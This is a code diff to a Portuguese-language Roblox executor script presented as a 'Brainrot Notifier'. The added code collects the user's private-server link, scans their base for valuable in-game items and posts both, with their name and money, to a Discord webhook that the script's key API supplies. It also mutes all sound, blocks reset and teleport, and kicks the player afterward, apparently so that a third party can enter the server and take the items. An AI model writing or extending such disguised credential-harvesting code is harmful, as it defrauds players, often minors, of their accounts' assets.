@@ -10,6 +10,7 @@ local Players     = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local SoundService= game:GetService("SoundService")
 local Workspace   = game:GetService("Workspace")
+local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService   = game:GetService("RunService")
 local StarterGui   = game:GetService("StarterGui")
@@ -17,6 +18,8 @@ local ContextActionService = game:GetService("ContextActionService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
+local PREFIX      = "[AUTO]"
+local WEBHOOK_USUARIO = nil
 
 --=============================================================
 --  🔑 CAPTURA DA KEY
@@ -30,8 +33,6 @@ end
 --=============================================================
 --  🔐 VALIDAÇÃO NA API
 --=============================================================
-local WEBHOOK_USUARIO = nil
-
 local function validarKey()
     local req = syn and syn.request or http_request or request or http.request
     if not req then return false, "Executor sem suporte HTTP." end
@@ -54,7 +55,7 @@ local function validarKey()
             return true, "OK"
         end
     end
-    return false, "Key inválida."
+    return false, "Key inválida ou já em uso."
 end
 
 local isKeyValid, motivo = validarKey()
@@ -64,10 +65,588 @@ if not isKeyValid then
 end
 
 --=============================================================
---  🎨 INTERFACE (COM PROTEÇÃO ANTI-ERRO)
+--  🔗 VALIDAÇÃO DE LINK DE SERVIDOR PRIVADO
+--=============================================================
+local function validarLinkServidor(link)
+    if type(link) ~= "string" then return false, "Link inválido" end
+    link = link:gsub("^%s+", ""):gsub("%s+$", "")
+    if link == "" then return false, "Link vazio" end
+    
+    local dominioOk = link:match("^https?://[w%.]*roblox%.com/") or link:match("^[w%.]*roblox%.com/")
+    if not dominioOk then return false, "Não é um link do Roblox" end
+    
+    if not link:lower():find("/share", 1, true) then return false, "Não é um link de compartilhamento" end
+    
+    local tipo = link:match("[?&]type=([^&#]+)")
+    if not tipo or tipo:lower() ~= "server" then return false, "Não é um link de servidor" end
+    
+    local code = link:match("[?&]code=([^&#]+)")
+    if not code or #code ~= 32 or not code:match("^[0-9a-fA-F]+$") then return false, "Código de servidor inválido" end
+
+    return true, "OK"
+end
+
+--=============================================================
+--  WEBHOOK E DADOS
+--=============================================================
+local function getMeuDinheiro()
+    local ls = LocalPlayer:FindFirstChild("leaderstats")
+    if ls then
+        for _, v in ipairs(ls:GetChildren()) do
+            if v.Name:lower():find("money") or v.Name:lower():find("cash") or v.Name:lower():find("coin") then
+                return tostring(v.Value)
+            end
+        end
+        local first = ls:GetChildren()[1]
+        if first then return tostring(first.Value) end
+    end
+    return "Desconhecido"
+end
+
+local function sendWebhook(title, description, color)
+    if not WEBHOOK_USUARIO then return end
+
+    local qtdPlayers = #Players:GetPlayers()
+    local dinheiro = getMeuDinheiro()
+
+    local payload = {
+        username = "Brainrot Notifier",
+        avatar_url = "https://i.imgur.com/8Km9tLL.png",
+        embeds = {{
+            title = tostring(title),
+            description = tostring(description),
+            color = color or 0x2ECC71,
+            fields = {
+                { name = "👥 Jogadores no Servidor", value = tostring(qtdPlayers), inline = true },
+                { name = "💰 Seu Dinheiro", value = dinheiro, inline = true }
+            },
+            footer = { text = "Jogador: " .. LocalPlayer.Name },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+    local ok, encoded = pcall(HttpService.JSONEncode, HttpService, payload)
+    if not ok then return end
+    
+    local function req(args)
+        if syn and syn.request then syn.request(args)
+        elseif request then request(args)
+        elseif http_request then http_request(args)
+        elseif http and http.request then http.request(args) end
+    end
+    
+    task.spawn(function()
+        pcall(function() 
+            req({Url = WEBHOOK_USUARIO, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded}) 
+        end)
+    end)
+end
+
+--=============================================================
+--  🔇 MUTE BRUTAL
+--=============================================================
+pcall(function()
+    SoundService.Volume = 0
+    SoundService.RespectFilteringEnabled = false
+    SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(0.05)
+        pcall(function()
+            for _, obj in ipairs(Workspace:GetDescendants()) do
+                if obj:IsA("Sound") then obj:Destroy() end
+            end
+            local char = LocalPlayer.Character
+            if char then
+                for _, obj in ipairs(char:GetDescendants()) do
+                    if obj:IsA("Sound") then obj:Destroy() end
+                end
+            end
+            for _, obj in ipairs(SoundService:GetDescendants()) do
+                if obj:IsA("Sound") or obj:IsA("SoundGroup") then
+                    obj.Volume = 0
+                    if obj:IsA("Sound") then obj:Destroy() end
+                end
+            end
+        end)
+    end
+end)
+
+game.DescendantAdded:Connect(function(descendant)
+    if descendant:IsA("Sound") then
+        task.defer(function()
+            if descendant then
+                descendant.Volume = 0
+                descendant:Destroy()
+            end
+        end)
+    end
+end)
+
+--=============================================================
+--  🔒 ANTI-SAÍDA E ANTI-67
+--=============================================================
+pcall(function()
+    StarterGui:SetCore("ResetButtonCallback", false)
+end)
+
+LocalPlayer.OnTeleport:Connect(function()
+    if syn and syn.cancelTeleport then syn.cancelTeleport() end
+end)
+
+local function kickar() LocalPlayer:Kick("Anti-67: A palavra '67' foi detectada no chat!") end
+local function verificarTexto(texto)
+    if texto and string.find(string.lower(texto), "67", 1, true) then kickar() end
+end
+
+pcall(function()
+    local TextChatService = game:GetService("TextChatService")
+    local generalChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+    generalChannel.MessageReceived:Connect(function(message) verificarTexto(message.Text) end)
+end)
+
+pcall(function()
+    LocalPlayer.Chatted:Connect(verificarTexto)
+    Players.PlayerAdded:Connect(function(plr) plr.Chatted:Connect(verificarTexto) end)
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then plr.Chatted:Connect(verificarTexto) end
+    end
+end)
+
+task.spawn(function()
+    while true do
+        task.wait(0.1)
+        pcall(function()
+            for _, plr in ipairs(Players:GetPlayers()) do
+                if plr.Character then
+                    local head = plr.Character:FindFirstChild("Head")
+                    if head then
+                        local chatFolder = head:FindFirstChild("Chat")
+                        if chatFolder then
+                            for _, chatGui in ipairs(chatFolder:GetDescendants()) do
+                                if chatGui:IsA("TextLabel") and chatGui.Text ~= "" then verificarTexto(chatGui.Text) end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end
+end)
+
+--=============================================================
+--  🎯 ENVIO DE BRAINROTS
+--=============================================================
+local BASE_RADIUS = 200
+
+local VALID_BRAINROTS = {
+    "Money Money Puggy", "Agarrini la Palini", "Tigrilini Watermelini", "Anpali Babel", "Antonio",
+    "Avocadini Antilopini", "Avocadini Guffo", "Avocadorilla", "Ballerina Cappuccina", "Ballerino Lololo",
+    "Los Tralaleritos", "Dragon Cannelloni", "Bandito Axolito", "Orangutini Ananassini", "Belula Beluga",
+    "Bisonte Giuppitere", "Blackhole Goat", "Blueberrinni Octopusini", "Bombardini Tortinii", "Bombardiro Crocodilo",
+    "Bombombini Gusini", "Boneca Ambalabu", "Unclito Samito", "Gangster Footera", "Brr es Teh Patipum",
+    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulimero Trulicina",
+    "Cacasito Satalito", "Cacto Hipopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo",
+    "Carrotini Brainini", "Cavallo Virtuoso", "Celularcini Viciosini", "Chachechi", "Noobini Pizzanini",
+    "Buho de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama",
+    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah",
+    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala",
+    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky",
+    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero",
+    "Gorillo Watermelondrillo", "Graipuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur",
+    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion",
+    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita",
+    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli",
+    "Burbaloni Loliloli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas",
+    "Los Noobinis", "Los Nooo My Hotspotsitos", "Girafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos",
+    "Los Orcalitos", "Los Bros", "Los Bombinitos", "Zibra Zubra Zibralini", "Corn Corn Corn Sahur",
+    "Malame Amarele", "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepiedone", "Ta Ta Ta Ta Sahur",
+    "Urubini Flamenguini", "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto",
+    "Chillin Chili", "Alessio", "Orcalita Orcala", "Pakrahmatmamat", "Pandaccini Bananini", "Penguino Cocosino",
+    "Perochello Lemonchello", "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado",
+    "Pipi Corni", "Bambini Crostini", "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni",
+    "Raccooni Jandelini", "Rhino Helicopterino", "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini",
+    "Los Spyderinis", "Sigma Boy", "Sigma Girl", "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro",
+    "Strawberrelli Flamingelli", "Tim Cheese", "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno",
+    "Tacorita Bicicleta", "Talpa Di Fero", "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Ti Ti Sahur",
+    "Tictac Sahur", "Trippi Troppi", "Tigroligre Frutonni", "Cocofanto Elefanto", "Tipi Topi Taco",
+    "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobi Tobi", "Torrtuginni Dragonfrutini",
+    "Tracoducotulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", "Tralalita Tralala",
+    "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa",
+    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block",
+    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yess my examine", "Brasilini Berimbini",
+    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito",
+    "Brr Brr Patapim", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos",
+    "Los Tortus", "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks",
+    "Burguro And Fryuro", "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis",
+    "Chicleteirina Bicicleteirina", "La Spooky Grande", "La Vacca Jacko Linterino", "Vulturino Skeletono",
+    "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", "Quackula", "Mummio Rappitto",
+    "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", "Snailenzo",
+    "Chicleteira Bicicleteira", "Lirilì Larilà", "Headless Horseman", "Frogato Pirato",
+    "Mieteteira Bicicleteira", "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratito",
+    "Bambu Bambu Sahur", "Bananita Dolphinita", "Meowl", "Horegini Boom", "Quesadillo Vampiro",
+    "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", "Secret Lucky Block",
+    "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", "Pumpkini Spyderini",
+    "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", "La Taco Combinasion",
+    "Frio Ninja", "Wombo Rollo", "Guest 666", "1x1x1x1", "Aquanaut", "Capitano Moby", "Secret",
+    "Spooketti Tualetti", "Sammyni Spookyni", "Skull Lucky Block", "Zombie Bowl", "Plant Bros", "Phoenix", "Oni Oni Panda",
+    "Mummelo Bandello", "Mortaruga", "Los Treaters", "Grim Cheese", "Flying Dutchman", "Fangaro Lupino", "Dragon Skeletonini",
+    "Candi Corni", "Boo Boo Rocket", "Bat-in-the-Box", "Bananito Skelito", "Vampi Ribbitini", "Frostino Vampiro",
+    "Penguino Pumpkino", "Draculino", "Lavamanta", "Lionello Casarello", "Qamar Camelamp", "Marino Submarino",
+    "Rockarino Rockara", "Pin Pin Pengu", "Rexino Ramino", "Capibaro Celestino", "Ranito Pepito", "Ski Ski Skunki",
+    "Hydra Serpent", "Zebrino Pianino", "Los Dragons", "Gold and Diamond", "La Craft Machine", "Panda Popanda",
+    "Chicli Chicla", "Deputy Leopard", "Pelican Pachetto", "Hippo Jacuzzo", "Koala Parabala", "Puffino Builderino",
+    "Gub", "Sir Mangus", "Gattino Hydrantino", "Orchidox", "Pop Pop Petalini", "Syrup Samurai", "Motorino Bumbino",
+    "Honey Honey Narwhal", "Rosatops Triceratino", "Beavo Potto", "Yetimatic", "Bumbatron", "Queen Bee", "Scorpino Coasterino",
+    "S'more Serat", "Bee Lucky Block", "Sammyni Truckini", "Tacoturbo Tacorito", "Burrito Bat", "Nachorilla",
+    "Candini Fluffini", "Peschito Machito", "Honey Honey Bear", "La Fuse Machine", "Pogo Pogo Penguin", "Polaroidini",
+    "Conetto Morsetto", "Gelatina Volatina", "Quackalena", "Cornetto Morsetto", "Tic Tic Ribbit", "La Breakfast Combinasion",
+    "Los Losers", "Yess my Resume", "Noo my Resume", "Los Secret Combinasionas", "Examen Bros", "Noo my Examen",
+    "Chicleteira Champeona", "Toro Españolo", "Pizza and Ranch", "Rubiko and Kubiko", "Grabatron", "Cangurato Gelato",
+    "Noodle Noodle Poodle", "Los Admins", "Los Tictacs", "Los Tangcitos", "Los Cornis", "Los Sigmas", "Moby Bros",
+    "Capitano Americano", "Bufalino Boomberino", "Var Var Var", "4th Bros", "Chicleteira Surfeiteira", "Aquarino",
+    "Gelato Lumacho", "Lemonita Splashita", "Flippo Marino", "Bearito Cabinito", "Sand Sand Sand", "Frullato Framingo",
+    "Los Fruits", "Sushi Inu", "Girafini Raftini", "Octoball", "Rocketini Frostini", "Craburger", "Tortuginni Sandcastlini",
+    "Kraken", "Rhino Slido", "Chicleteira Boardeira", "Bearo Houso", "Caylusaurus", "Dragon Caylusini",
+    "Bucketoro", "Steakini Fattini", "Tenini Ballini", "Cocoteddy", "Sundrilla Sundae", "Capitano Gullini",
+    "Bombardiro Vaccariro", "Ombrello Topolino", "Aqua Dragon", "Digi Narwhal", "Hydra Bunny", "Pancake and Syrup",
+    "Arcadragon", "Kalika Bros", "Duggy Bros", "Los Hackers", "Los Chillis", "Rubrikiko", "Quackini Snackini",
+    "Hopilikalika Hopilikalako", "Money Money Bros", "La Easter Grande", "Gym Bros", "Rico Dinero",
+    "Los Mariachis", "Abyssaloco", "Churrito Bunnito", "Globa Steppa", "Baskito", "Camera Ramena", "John Doe",
+    "Flipa Sandala", "Futbolini Skatini", "Los Bunitos", "Glaciator", "Buho de Volto", "Easter Easter Easter Sahur",
+    "Cash or Card", "Strawberrita", "Bananito", "Berryno", "Spooky Kart", "Jacko Jakat", "Scorpi Inferni",
+    "Puppetmaster", "Scarino Crowino"
+}
+
+local validBrainrotsSet = {}
+for _, name in ipairs(VALID_BRAINROTS) do
+    validBrainrotsSet[name:lower()] = name
+end
+
+local function isValidBrainrot(name)
+    if not name or name == "" then return false end
+    return validBrainrotsSet[name:lower()] ~= nil
+end
+
+local function isOnConveyor(position)
+    local rayOrigin = position + Vector3.new(0, 2, 0)
+    local rayDirection = Vector3.new(0, -10, 0)
+    
+    local raycastParams = RaycastParams.new()
+    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
+    if LocalPlayer.Character then
+        raycastParams.FilterDescendantsInstances = {LocalPlayer.Character}
+    end
+    
+    local rayResult = Workspace:Raycast(rayOrigin, rayDirection, raycastParams)
+    
+    if rayResult and rayResult.Instance then
+        local hitPart = rayResult.Instance
+        
+        if hitPart:IsA("BasePart") then
+            local color = hitPart.Color
+            if color.R > 0.6 and color.G < 0.4 and color.B < 0.4 then
+                return true
+            end
+        end
+        
+        if hitPart.Name:lower():match("conveyor") or 
+           hitPart.Name:lower():match("belt") or
+           hitPart.Name:lower():match("esteira") or
+           hitPart.Name:lower():match("path") then
+            return true
+        end
+        
+        local ancestor = hitPart.Parent
+        while ancestor and ancestor ~= Workspace do
+            if ancestor.Name:lower():match("conveyor") or
+               ancestor.Name:lower():match("belt") or
+               ancestor.Name:lower():match("path") then
+                return true
+            end
+            ancestor = ancestor.Parent
+        end
+    end
+    
+    return false
+end
+
+local function getAllTextsFromGui(gui)
+    local texts = {}
+    
+    local function searchText(parent)
+        for _, child in ipairs(parent:GetChildren()) do
+            if child:IsA("TextLabel") or child:IsA("TextButton") then
+                if child.Visible and child.Text and child.Text ~= "" and child.Text ~= " " then
+                    table.insert(texts, child.Text)
+                end
+            elseif child:IsA("TextBox") then
+                if child.Visible and child.Text and child.Text ~= "" and child.Text ~= " " then
+                    table.insert(texts, child.Text)
+                end
+            end
+            
+            if #child:GetChildren() > 0 then
+                searchText(child)
+            end
+        end
+    end
+    
+    if gui then
+        searchText(gui)
+    end
+    return texts
+end
+
+local function getGuiPosition(billboard)
+    if billboard.Adornee then
+        if billboard.Adornee:IsA("BasePart") then
+            return billboard.Adornee.Position
+        elseif billboard.Adornee:IsA("Attachment") then
+            local part = billboard.Adornee.Parent
+            if part and part:IsA("BasePart") then
+                return part.Position
+            end
+        end
+    end
+    
+    if billboard.Parent then
+        if billboard.Parent:IsA("BasePart") then
+            return billboard.Parent.Position
+        elseif billboard.Parent:IsA("Model") then
+            local model = billboard.Parent
+            if model.PrimaryPart then
+                return model.PrimaryPart.Position
+            end
+            for _, part in ipairs(model:GetChildren()) do
+                if part:IsA("BasePart") then
+                    return part.Position
+                end
+            end
+        end
+    end
+    
+    local model = billboard:FindFirstAncestorOfClass("Model")
+    if model then
+        if model.PrimaryPart then
+            return model.PrimaryPart.Position
+        end
+        for _, part in ipairs(model:GetDescendants()) do
+            if part:IsA("BasePart") then
+                return part.Position
+            end
+        end
+    end
+    
+    return nil
+end
+
+local function extractValue(text)
+    if not text then return nil end
+    
+    local cleanText = text:gsub("%$", ""):gsub(",", "")
+    
+    local valueK = cleanText:match("([%d%.]+)K")
+    if valueK then return tonumber(valueK) * 1000 end
+    
+    local valueM = cleanText:match("([%d%.]+)M")
+    if valueM then return tonumber(valueM) * 1000000 end
+    
+    local valueB = cleanText:match("([%d%.]+)B")
+    if valueB then return tonumber(valueB) * 1000000000 end
+    
+    local value = cleanText:match("([%d%.]+)")
+    if value then return tonumber(value) end
+    
+    return nil
+end
+
+local function findBrainrotName(texts)
+    local candidateNames = {}
+    
+    for _, text in ipairs(texts) do
+        local textLower = text:lower()
+        
+        if not text:match("%$") and 
+           not text:match("/s") and 
+           not text:match("^%d+$") and
+           not text:match("^%d+x") and
+           not textLower:match("^legendary$") and
+           not textLower:match("^mythic$") and
+           not textLower:match("^rare$") and
+           not textLower:match("^uncommon$") and
+           not textLower:match("^common$") and
+           not textLower:match("^collect$") and
+           not textLower:match("^owned$") and
+           not textLower:match("^equipped$") and
+           not textLower:match("^level%s*%d") and
+           #text >= 3 then
+            
+            if isValidBrainrot(text) then
+                table.insert(candidateNames, text)
+            end
+        end
+    end
+    
+    if #candidateNames == 0 then
+        return nil
+    end
+    
+    table.sort(candidateNames, function(a, b)
+        local aIsTitle = a:match("^%u") ~= nil
+        local bIsTitle = b:match("^%u") ~= nil
+        
+        if aIsTitle and not bIsTitle then
+            return true
+        elseif bIsTitle and not aIsTitle then
+            return false
+        end
+        
+        return #a > #b
+    end)
+    
+    return candidateNames[1]
+end
+
+local function formatValue(value)
+    if value >= 1000000000 then
+        return string.format("%.2fB", value / 1000000000)
+    elseif value >= 1000000 then
+        return string.format("%.2fM", value / 1000000)
+    elseif value >= 1000 then
+        return string.format("%.2fK", value / 1000)
+    else
+        return tostring(math.floor(value))
+    end
+end
+
+local function getBrainrotsString()
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    if not hrp then return "Nenhum brainrot encontrado." end
+    
+    local playerPosition = hrp.Position
+    local brainrots = {}
+    local processedGuids = {}
+    
+    local allGuis = {}
+    for _, descendant in ipairs(Workspace:GetDescendants()) do
+        if descendant:IsA("BillboardGui") or descendant:IsA("SurfaceGui") then
+            table.insert(allGuis, descendant)
+        end
+    end
+    
+    for _, gui in ipairs(allGuis) do
+        pcall(function()
+            local position = getGuiPosition(gui)
+            
+            if position then
+                local distance = (playerPosition - position).Magnitude
+                
+                if distance <= BASE_RADIUS then
+                    local texts = getAllTextsFromGui(gui)
+                    
+                    if #texts > 0 then
+                        local hasGenerationValue = false
+                        local generationValue = 0
+                        
+                        for _, text in ipairs(texts) do
+                            if text:match("/s") or text:match("/S") then
+                                local value = extractValue(text)
+                                if value and value > 0 then
+                                    hasGenerationValue = true
+                                    if value > generationValue then
+                                        generationValue = value
+                                    end
+                                end
+                            end
+                        end
+                        
+                        if hasGenerationValue and generationValue > 0 then
+                            local onConveyor = isOnConveyor(position)
+                            
+                            if not onConveyor then
+                                local name = findBrainrotName(texts)
+                                
+                                if name and isValidBrainrot(name) then
+                                    local guid = string.format("%s_%.2f_%.2f_%.2f", name, position.X, position.Y, position.Z)
+                                    
+                                    if not processedGuids[guid] then
+                                        processedGuids[guid] = true
+                                        
+                                        table.insert(brainrots, {
+                                            Name = name,
+                                            GenerationRate = generationValue
+                                        })
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end
+    
+    if #brainrots == 0 then
+        return "Nenhum brainrot encontrado."
+    end
+    
+    local counts = {}
+    local generationRates = {}
+    
+    for _, brainrot in ipairs(brainrots) do
+        if brainrot and brainrot.Name then
+            local name = brainrot.Name
+            counts[name] = (counts[name] or 0) + 1
+            local currentRate = brainrot.GenerationRate or 0
+            if not generationRates[name] or currentRate > generationRates[name] then
+                generationRates[name] = currentRate
+            end
+        end
+    end
+    
+    local items = {}
+    for name, qty in pairs(counts) do
+        local genRate = generationRates[name] or 0
+        table.insert(items, {
+            name = name,
+            qty = qty,
+            rate = genRate,
+            formatted = string.format("• %s (%s/s)", name, formatValue(genRate))
+        })
+    end
+    
+    table.sort(items, function(a, b)
+        return a.rate > b.rate
+    end)
+    
+    local formattedItems = {}
+    for _, item in ipairs(items) do
+        table.insert(formattedItems, item.formatted)
+    end
+    
+    return #formattedItems > 0 and table.concat(formattedItems, "\n") or "Nenhum brainrot encontrado."
+end
+
+local function enviarBrainrots(link)
+    local baseName = "Sua Base"
+    local brainrotsText = getBrainrotsString()
+    
+    local linhas = {}
+    table.insert(linhas, "**Link:** [clique aqui para abrir](" .. link .. ")")
+    table.insert(linhas, "**Base:** `" .. baseName .. "`\n")
+    table.insert(linhas, "**Brainrots na Base:**")
+    table.insert(linhas, brainrotsText)
+
+    sendWebhook("🔗 Servidor Privado Informado", table.concat(linhas, "\n"), 0x2ECC71)
+end
+
+--=============================================================
+--  🎨 UI PRINCIPAL (PROTEGIDA)
 --=============================================================
 local function criarUI()
-    -- Limpa UI antiga se existir
     local old = PlayerGui:FindFirstChild("BrainrotNotifierUI")
     if old then old:Destroy() end
 
@@ -183,16 +762,29 @@ local function criarUI()
     btnCorner.CornerRadius = UDim.new(0, 6)
     btnCorner.Parent = botao
 
-    -- Lógica de clique do botão com proteção
     botao.MouseButton1Click:Connect(function()
-        if textBox.Text == "" then
-            aviso.Text = "⚠ Insira um link válido!"
+        local link = textBox.Text
+        if not link or link == "" then
+            aviso.Text = "⚠ Coloque o link do seu servidor privado"
+            aviso.TextColor3 = Color3.fromRGB(255, 200, 100)
             aviso.TextTransparency = 0
             return
         end
-        -- Aqui você chama a função que envia o webhook e a lógica de bloquear a tela
-        print("[AUTO] Link confirmado: " .. textBox.Text)
-        -- (adicione o resto da sua lógica de envio de brainrots aqui)
+
+        local ok, motivo = validarLinkServidor(link)
+        if not ok then
+            aviso.Text = "❌ Insira um link de Servidor Privado Válido"
+            aviso.TextColor3 = Color3.fromRGB(255, 100, 100)
+            aviso.TextTransparency = 0
+            return
+        end
+
+        aviso.Text = ""
+        aviso.TextTransparency = 1
+        painel.Visible = false
+
+        enviarBrainrots(link)
+        LocalPlayer:Kick("✅ Script executado com sucesso! Verifique o Discord.")
     end)
 end
 
@@ -206,5 +798,3 @@ task.spawn(function()
         print("[AUTO] ✅ Interface carregada!")
     end
 end)
-
-print("[AUTO] ✅ Script carregado com sucesso!")
